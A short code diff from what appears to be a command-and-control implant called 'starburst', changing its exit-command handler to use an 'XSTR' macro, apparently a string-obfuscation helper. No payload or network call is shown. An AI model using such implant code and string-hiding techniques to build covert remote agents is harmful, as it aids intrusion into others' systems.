@@ -15,7 +15,7 @@ auto declfn starburst::cmd_exit(
     _In_    Parser*   params
 ) -> void {
     DBG_PRINT( inst, "cmd_exit: shutting down\n" );
-    queue_response( inst, task_uuid, RESPONSE_SUCCESS, symbol<char*>( const_cast<char*>( "" ) ) );
+    queue_response( inst, task_uuid, RESPONSE_SUCCESS, XSTR( "" ) );
     inst.agent.running = false;
 }
 
